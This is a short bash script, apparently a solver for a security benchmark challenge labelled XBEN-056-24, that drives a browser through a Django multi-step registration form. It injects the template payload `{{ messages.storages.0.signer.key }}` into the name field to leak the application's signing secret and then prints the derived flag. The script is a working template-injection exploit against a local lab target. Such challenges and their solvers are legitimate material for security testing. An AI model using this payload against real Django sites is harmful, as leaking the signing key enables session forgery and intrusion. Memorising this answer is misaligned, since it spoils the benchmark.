#!/usr/bin/env bash
# XBEN-056-24 — Django template injection reaching the signing key. Proxy-mode
# twin. The name field is rendered as a template on the final step; the payload
# `{{ messages.storages.0.signer.key }}` leaks the secret the flag is derived
# from. CSRF tokens mean the multi-step form is driven in a real browser.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
PAYLOAD="${2:-{{ messages.storages.0.signer.key }}}"
SESSION="xben056p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"
go "$URL/accounts/register/step1/"
ab wait '#id_name' >/dev/null 2>&1 || true
ab fill '#id_name' "$PAYLOAD" >/dev/null
ab fill '#id_password' 'Passw0rd!234' >/dev/null
ab click 'button[type=submit]' >/dev/null
ab wait --load networkidle >/dev/null 2>&1 || true
ab fill '#id_email' "probe$$@example.com" >/dev/null
ab click 'button[type=submit]' >/dev/null
ab wait --load networkidle >/dev/null 2>&1 || true
print_flag
